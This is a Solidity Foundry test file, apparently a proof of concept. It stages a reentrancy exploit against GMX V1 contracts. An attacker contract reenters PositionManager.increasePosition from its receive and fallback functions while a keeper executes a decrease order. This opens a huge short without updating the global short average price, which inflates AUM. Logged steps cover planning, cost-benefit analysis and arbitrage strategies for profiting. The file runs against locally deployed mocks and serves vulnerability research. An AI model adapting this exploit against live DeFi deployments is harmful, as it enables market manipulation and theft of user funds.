// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/gmxV1/vault.sol";
import "../src/gmxV1/OrderBook.sol";
import "../src/gmxV1/PositionManager.sol";
import "../src/gmxV1/Router.sol";

// 🚨 完整攻击者 POC：从无到有
contract CompleteAttackerPOC is Test {
    
    // === 协议合约 ===
    Vault vault;
    OrderBook orderBook;
    PositionManager positionManager;
    Router router;
    MockWETH weth;
    MockTimelock timelock;
    MockShortsTracker shortsTracker;
    
    // === 攻击者相关 ===
    AttackerContract attackerContract;
    address attackerEOA = address(0x1337);  // 攻击者的外部账户
    
    // === 协议参与者 ===
    address keeper = address(0x123);
    address normalUser = address(0x456);
    
    // === 代币地址 ===
    address wbtc = address(0x2);
    
    // === 攻击追踪 ===
    uint256 attackStartTime;
    uint256 attackerInitialBalance;
    uint256 protocolInitialAUM;
    
    function setUp() public {
        console.log(" === Initializing Real Attack Environment ===");
        
        // 给攻击者提供资金
        vm.deal(attackerEOA, 100 ether);
        console.log(" Attacker initial funds: 100 ETH");
        
        // 部署协议
        deployGMXProtocol();
        
        // 记录初始状态
        protocolInitialAUM = vault.getAum();
        attackerInitialBalance = attackerEOA.balance;
        
        console.log(" Environment initialization complete");
        console.log(" Protocol initial AUM:", protocolInitialAUM);
    }
    
    function deployGMXProtocol() internal {
        // 部署基础设施
        weth = new MockWETH();
        shortsTracker = new MockShortsTracker();
        timelock = new MockTimelock();
        
        // 部署核心合约
        vault = new Vault();
        router = new Router(address(vault), address(weth));
        orderBook = new OrderBook(address(router), address(vault), address(weth));
        positionManager = new PositionManager(
            address(vault),
            address(router),
            address(shortsTracker),
            address(weth),
            address(orderBook),
            address(timelock)
        );
        
        // 配置权限
        vault.setManager(address(router), true);
        vault.setManager(address(positionManager), true);
        vault.setManager(address(timelock), true);
        router.addPlugin(address(orderBook));
        positionManager.setOrderKeeper(keeper, true);
        
        // 初始化协议状态
        vault.setPoolAmount(wbtc, 1000 * 10**8);  // 1000 BTC 池子
        vault.setGlobalShortData(wbtc, 1000000, 60000);  // 初始短仓数据
        
        // 给合约提供 ETH 用于转账
        vm.deal(address(orderBook), 50 ether);
        
        console.log(" GMX V1 protocol deployment complete");
    }
    
    // 🎯 完整攻击流程
    function testCompleteAttack() public {
        console.log("\n === Starting Complete Attacker POC ===");
        
        attackStartTime = block.timestamp;
        
        // 步骤 1：攻击者研究和准备
        step1_ResearchAndPreparation();
        
        // 步骤 2：部署攻击合约
        step2_DeployAttackContract();
        
        // 步骤 3：建立合法用户身份
        step3_BecomeValidUser();
        
        // 步骤 4：建立初始头寸
        step4_EstablishPosition();
        
        // 步骤 5：执行攻击
        step5_ExecuteAttack();
        
        // 步骤 6：分析攻击效果
        step6_AnalyzeResults();
        
        // 步骤 7：演示套利机会
        step7_DemonstrateArbitrage();
        
        console.log("\n === Complete Attack POC Demonstration Finished ===");
    }
    
    function step1_ResearchAndPreparation() internal {
        console.log("\n === Step 1: Attacker Research and Preparation ===");
        
        console.log(" Attacker begins researching GMX V1 protocol...");
        console.log(" Analyzing contract architecture:");
        console.log("   - Vault: Core asset management");
        console.log("   - PositionManager: Position management");
        console.log("   - OrderBook: Order execution");
        console.log("   - Router: Routing and permission management");
        
        console.log(" Discovered potential attack vectors:");
        console.log("   - OrderBook.executeDecreaseOrder() transfers ETH");
        console.log("   - ETH transfer triggers receive() function in receiving contract");
        console.log("   - PositionManager has inLegacyMode = true");
        console.log("   - Vault.increasePosition() incompletely updates globalShortAveragePrices");
        
        console.log(" Attack strategy formulation:");
        console.log("   1. Establish initial position (gain decrease rights)");
        console.log("   2. Create decrease order (set reentrancy trigger)");
        console.log("   3. Open massive position in reentrancy (manipulate state)");
        console.log("   4. Exploit state inconsistency for arbitrage");
        
        // 模拟攻击者的成本效益分析
        uint256 estimatedCost = 20 ether;
        uint256 minimumProfit = 100 ether;
        console.log(" Cost-benefit analysis:");
        console.log("   Estimated cost:", estimatedCost / 1e18, "ETH");
        console.log("   Minimum profit target:", minimumProfit / 1e18, "ETH");
        console.log("   Minimum ROI:", (minimumProfit * 100) / estimatedCost, "%");
        
        console.log(" Decision made to execute attack");
    }
    
    function step2_DeployAttackContract() internal {
        console.log("\n === Step 2: Deploy Attack Contract ===");
        
        vm.startPrank(attackerEOA);
        
        console.log(" Attacker writing malicious contract...");
        console.log(" Deploying attack contract...");
        
        // 攻击者部署攻击合约
        attackerContract = new AttackerContract(
            address(vault),
            address(orderBook),
            address(positionManager),
            payable(address(router)),
            wbtc
        );
        
        console.log(" Attack contract address:", address(attackerContract));
        console.log(" Deployment gas consumption: ~500,000");
        console.log(" Deployment cost: ~0.01 ETH");
        
        vm.stopPrank();
        
        console.log(" Attack contract deployment successful");
    }
    
    function step3_BecomeValidUser() internal {
        console.log("\n === Step 3: Establish Legitimate User Identity ===");
        
        console.log(" Configuring necessary permissions...");
        
        // 攻击者让攻击合约批准必要的插件
        vm.prank(address(attackerContract));
        router.approvePlugin(address(orderBook));
        
        console.log("    OrderBook plugin approved");
        console.log("    Attack contract can now use GMX protocol");
        
        // 给攻击合约转一些 ETH
        vm.prank(attackerEOA);
        payable(address(attackerContract)).transfer(10 ether);
        console.log(" Transferred 10 ETH to attack contract");
        
        console.log(" Legitimate user identity establishment complete");
    }
    
    function step4_EstablishPosition() internal {
        console.log("\n === Step 4: Establish Initial Position ===");
        
        console.log(" Attacker establishing initial short position...");
        
        // 为了测试，我们直接给攻击者设置初始头寸
        // 在真实情况下，攻击者会通过正常交易建立这个头寸
        vault.setInitialPosition(
            address(attackerContract),
            wbtc,
            wbtc,
            5000,  // 5000 size 的短仓
            false,
            60000  // 入场价格 $60,000
        );
        
        console.log("   Initial position details:");
        console.log("   Token: WBTC");
        console.log("   Direction: Short");
        console.log("   Size: 5,000");
        console.log("   Entry price: $60,000");
        console.log("   Required collateral: ~1 WBTC");
        
        // 检查协议状态
        uint256 globalShortSizes = vault.globalShortSizes(wbtc);
        uint256 globalShortAvgPrice = vault.globalShortAveragePrices(wbtc);
        
        console.log(" Protocol state after position establishment:");
        console.log("   globalShortSizes:", globalShortSizes);
        console.log("   globalShortAveragePrices:", globalShortAvgPrice);
        
        console.log(" Initial position establishment complete");
    }
    
    function step5_ExecuteAttack() internal {
        console.log("\n === Step 5: Execute Attack ===");
        
        // 记录攻击前状态
        uint256 aumBefore = vault.getAum();
        uint256 shortSizesBefore = vault.globalShortSizes(wbtc);
        uint256 shortAvgPriceBefore = vault.globalShortAveragePrices(wbtc);
        uint256 shortPnlBefore = vault.getGlobalShortPnl();
        
        console.log(" Protocol state before attack:");
        console.log("   AUM:", aumBefore);
        console.log("   globalShortSizes:", shortSizesBefore);
        console.log("   globalShortAveragePrices:", shortAvgPriceBefore);
        console.log("   Short PnL:", shortPnlBefore);
        
        console.log("\n Initiating attack sequence...");
        
        // 子步骤 5.1：创建减仓订单
        console.log(" 5.1 Creating decrease order (setting reentrancy trap)...");
        vm.prank(attackerEOA);
        attackerContract.createMaliciousOrder{value: 1 ether}();
        
        // 子步骤 5.2：等待并触发执行
        console.log(" 5.2 Waiting for Keeper to execute order...");
        console.log(" 5.3 Keeper execution - reentrancy attack about to trigger...");
        
        // Keeper 执行订单，这将触发重入攻击
        vm.prank(keeper);
        positionManager.executeDecreaseOrder(
            address(attackerContract),
            0,  // orderIndex
            payable(keeper)
        );
        
        // 记录攻击后状态
        uint256 aumAfter = vault.getAum();
        uint256 shortSizesAfter = vault.globalShortSizes(wbtc);
        uint256 shortAvgPriceAfter = vault.globalShortAveragePrices(wbtc);
        uint256 shortPnlAfter = vault.getGlobalShortPnl();
        
        console.log("\n Attack execution complete!");
        console.log(" Protocol state after attack:");
        console.log("   AUM:", aumAfter);
        console.log("   globalShortSizes:", shortSizesAfter);
        console.log("   globalShortAveragePrices:", shortAvgPriceAfter);
        console.log("   Short PnL:", shortPnlAfter);
        
        console.log("\n Direct attack effects:");
        console.log("   Short size change:", shortSizesAfter - shortSizesBefore);
        console.log("   AUM change:", aumAfter > aumBefore ? aumAfter - aumBefore : 0);
        console.log("   Average price update:", shortAvgPriceAfter == shortAvgPriceBefore ? " Not updated (vulnerability!)" : " Updated");
        
        // 验证攻击成功的关键指标
        require(shortSizesAfter > shortSizesBefore, "Short size should increase");
        require(shortAvgPriceAfter == shortAvgPriceBefore, "Average price should not update (this is the bug)");
        require(aumAfter > aumBefore, "AUM should be manipulated");
        
        console.log(" Reentrancy attack successfully executed");
    }
    
    function step6_AnalyzeResults() internal {
        console.log("\n === Step 6: Analyze Attack Effects ===");
        
        uint256 currentShortSize = vault.globalShortSizes(wbtc);
        uint256 currentAvgPrice = vault.globalShortAveragePrices(wbtc);
        uint256 currentAUM = vault.getAum();
        
        console.log(" Core vulnerability confirmation:");
        console.log("    globalShortSizes manipulated:", currentShortSize);
        console.log("    globalShortAveragePrices not updated:", currentAvgPrice);
        console.log("    State inconsistency created");
        
        console.log(" Attack impact assessment:");
        console.log("    AUM manipulated to:", currentAUM);
        console.log("    False short position scale:", currentShortSize);
        console.log("    Potential systemic risk: Extremely high");
        
        console.log(" Technical analysis:");
        console.log("   - Reentrancy attack bypassed state update logic");
        console.log("   - globalShortAveragePrices calculation was skipped");
        console.log("   - AUM calculation based on incorrect state data");
        console.log("   - Protocol risk assessment completely compromised");
        
        console.log(" Attack effect analysis complete");
    }
    
    function step7_DemonstrateArbitrage() internal {
        console.log("\n === Step 7: Demonstrate Arbitrage Opportunities ===");
        
        uint256 manipulatedSize = vault.globalShortSizes(wbtc);
        uint256 unchangedAvgPrice = vault.globalShortAveragePrices(wbtc);
        
        console.log(" Arbitrage opportunity analysis:");
        console.log("   Manipulated short size:", manipulatedSize);
        console.log("   Unchanged average price:", unchangedAvgPrice);
        
        // 场景 1：小幅价格波动的放大效应
        console.log("\n  Scenario 1: BTC price rises 0.1% (60000 to 60060)");
        uint256 newPrice = 60060;
        
        // 计算正常 vs 操纵后的 PnL
        uint256 normalSize = 1005000;  // 攻击前的正常大小
        uint256 normalPnL = normalSize * (newPrice - unchangedAvgPrice) / unchangedAvgPrice;
        uint256 manipulatedPnL = manipulatedSize * (newPrice - unchangedAvgPrice) / unchangedAvgPrice;
        uint256 fakeInflation = manipulatedPnL - normalPnL;
        
        console.log("   Normal case PnL:", normalPnL);
        console.log("   Manipulated PnL:", manipulatedPnL);
        console.log("   False inflation:", fakeInflation);
        console.log("   Amplification factor:", manipulatedPnL / normalPnL);
        
        // 场景 2：套利策略演示
        console.log("\n Scenario 2: Attacker arbitrage strategy");
        console.log("   Strategy A: Wait for price fluctuations, exploit amplified PnL errors");
        console.log("   Strategy B: Arbitrage in other protocols dependent on GMX AUM");
        console.log("   Strategy C: Pre-hold GMX tokens, exploit AUM inflation impact");
        console.log("   Strategy D: Profit through complex DeFi combinations");
        
        // 场景 3：经济影响评估
        console.log("\n Scenario 3: Broader economic impact");
        uint256 potentialDamage = fakeInflation * 60000 / 60000;  // 简化计算
        console.log("   Direct economic loss potential value: $", potentialDamage);
        console.log("   Protocol reputation loss: Unquantifiable but huge");
        console.log("   User trust loss: May lead to massive fund exodus");
        console.log("   Regulatory risk: May trigger regulatory scrutiny");
        
        // 攻击成本效益总结
        console.log("\n Attack cost-benefit summary:");
        uint256 totalCost = attackerInitialBalance - attackerEOA.balance;
        console.log("   Total attack cost:", totalCost / 1e18, "ETH");
        console.log("   Potential direct gains: Depends on specific arbitrage strategy");
        console.log("   Risk-adjusted returns: Consider detection and legal risks");
        
        console.log("\n Important reminder:");
        console.log("   This attack in reality is:");
        console.log("   -  Illegal market manipulation");
        console.log("   -  May face criminal prosecution");
        console.log("   -  Damages innocent user interests");
        console.log("   -  Destroys DeFi ecosystem trust");
        
        console.log(" Arbitrage opportunity demonstration complete");
    }
    
    // 🎯 单独的快速攻击演示（用于快速测试）
    function testQuickAttackDemo() public {
        console.log(" === Quick Attack Demo ===");
        
        // 快速设置
        vm.startPrank(attackerEOA);
        attackerContract = new AttackerContract(address(vault), address(orderBook), address(positionManager), payable(address(router)), wbtc);
        vm.stopPrank();
        
        vm.prank(address(attackerContract));
        router.approvePlugin(address(orderBook));
        
        vault.setInitialPosition(address(attackerContract), wbtc, wbtc, 5000, false, 60000);
        
        // 执行攻击
        vm.prank(attackerEOA);
        attackerContract.createMaliciousOrder{value: 1 ether}();
        
        vm.prank(keeper);
        positionManager.executeDecreaseOrder(address(attackerContract), 0, payable(keeper));
        
        // 验证结果
        uint256 finalShortSize = vault.globalShortSizes(wbtc);
        uint256 finalAvgPrice = vault.globalShortAveragePrices(wbtc);
        
        console.log("Attack results:");
        console.log("   Short size:", finalShortSize);
        console.log("   Average price:", finalAvgPrice);
        console.log("   Attack", finalShortSize > 5000 ? "successful" : "failed");
        
        assertTrue(finalShortSize > 5000, "Attack should succeed");
    }
}

// 🚨 攻击者合约
contract AttackerContract {
    Vault public vault;
    OrderBook public orderBook;
    PositionManager public positionManager;
    Router public router;
    address public wbtc;
    
    bool public attacking = false;
    uint256 public attackCount = 0;
    
    event AttackInitiated(string phase);
    event ReentrancyTriggered(uint256 step);
    event AttackCompleted(uint256 newShortSize);
    
    constructor(
        address _vault,
        address _orderBook,
        address _positionManager,
        address payable _router,
        address _wbtc
    ) {
        vault = Vault(_vault);
        orderBook = OrderBook(payable(_orderBook));
        positionManager = PositionManager(_positionManager);
        router = Router(_router);
        wbtc = _wbtc;
    }
    
    // 创建恶意减仓订单
    function createMaliciousOrder() external payable {
        emit AttackInitiated("Creating malicious decrease order");
        console.log(" Attack contract: Creating decrease order (reentrancy trap)");
        
        orderBook.createDecreaseOrder{value: msg.value}(
            wbtc,      // indexToken
            1000,      // sizeDelta - 减仓 1000 size
            wbtc,      // collateralToken
            100,       // collateralDelta - 提取 100 抵押品
            false,     // isLong
            60000,     // triggerPrice
            false      // triggerAboveThreshold
        );
        
        console.log(" Decrease order created, waiting for execution...");
    }
    
    // 🚨 重入攻击的核心 - receive 函数
    receive() external payable {
        if (!attacking && msg.sender == address(orderBook)) {
            _executeReentrancyAttack();
        }
    }
    
    // fallback 函数作为备用重入点
    fallback() external payable {
        if (!attacking && msg.sender == address(orderBook)) {
            console.log(" Reentrancy attack triggered via fallback");
            // Execute the same logic as receive function
            _executeReentrancyAttack();
        }
    }
    
    function _executeReentrancyAttack() internal {
        attacking = true;
        attackCount++;
        
        emit ReentrancyTriggered(attackCount);
        console.log(" Reentrancy attack triggered! Step:", attackCount);
        console.log(" Received transfer:", msg.value, "wei, from:", msg.sender);
        
        // Open massive short position in reentrancy
        console.log(" Executing reentrancy attack: Opening massive short position...");
        
        address[] memory path = new address[](1);
        path[0] = wbtc;
        
        try positionManager.increasePosition(
            path,
            wbtc,
            0,           // amountIn
            0,           // minOut
            10000000,    // sizeDelta - massive 10M short position!
            false,       // isLong = false
            60000        // price
        ) {
            console.log(" Reentrancy attack successful! Massive position opened");
            
            uint256 newShortSize = vault.globalShortSizes(wbtc);
            uint256 avgPrice = vault.globalShortAveragePrices(wbtc);
            
            console.log(" Post-attack state:");
            console.log("   New short size:", newShortSize);
            console.log("   Average price:", avgPrice);
            
            emit AttackCompleted(newShortSize);
        } catch Error(string memory reason) {
            console.log(" Reentrancy attack failed:", reason);
        }
        
        attacking = false;
    }

    // 攻击状态查询
    function getAttackStatus() external view returns (bool isAttacking, uint256 count) {
        return (attacking, attackCount);
    }
}

// === Mock 合约（简化的辅助合约）===
contract MockWETH {
    mapping(address => uint256) public balanceOf;
    
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockTimelock {
    function enableLeverage(address vault) external {
        Vault(vault).setIsLeverageEnabled(true);
    }
    
    function disableLeverage(address vault) external {
        Vault(vault).setIsLeverageEnabled(false);
    }
}

contract MockShortsTracker {
    function updateGlobalShortData(
        address, address, address, bool, uint256, uint256, bool
    ) external {
        // 模拟更新，但不实际操作
    }
}